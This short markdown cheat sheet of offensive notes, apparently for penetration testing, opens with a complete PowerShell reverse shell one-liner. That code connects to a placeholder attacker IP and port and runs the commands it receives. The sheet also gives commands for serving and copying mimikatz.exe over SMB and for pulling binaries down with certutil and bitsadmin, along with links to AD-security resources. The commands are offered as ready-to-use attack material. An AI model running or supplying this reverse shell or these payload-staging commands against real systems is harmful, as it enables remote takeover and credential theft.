# Reverse Shell

```$client = New-Object System.Net.Sockets.TCPClient("$IP$",$PORT$);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()```

# Formation AD Security 101

* https://github.com/cfalta/adsec

# Useful links 

* https://beta.hackndo.com/
* https://lolbas-project.github.io/

# Tools 

* https://github.com/microsoft/AttackSurfaceAnalyzer

# File Transfer 

## SMB

* sudo python3 smbserver.py ROPNOP /mnt/toto
* net view \\10.9.68.115
* COPY \\10.9.68.115\ROPNOP\mimikatz.exe .

## HTTP

* certutil.exe -urlcache -split -f "https://ip/binaire" xxx.exe
* bitsadmin /transfer myDownloadJob /download /priority normal http://downloadsrv/10mb.zip c:\10mb.zip

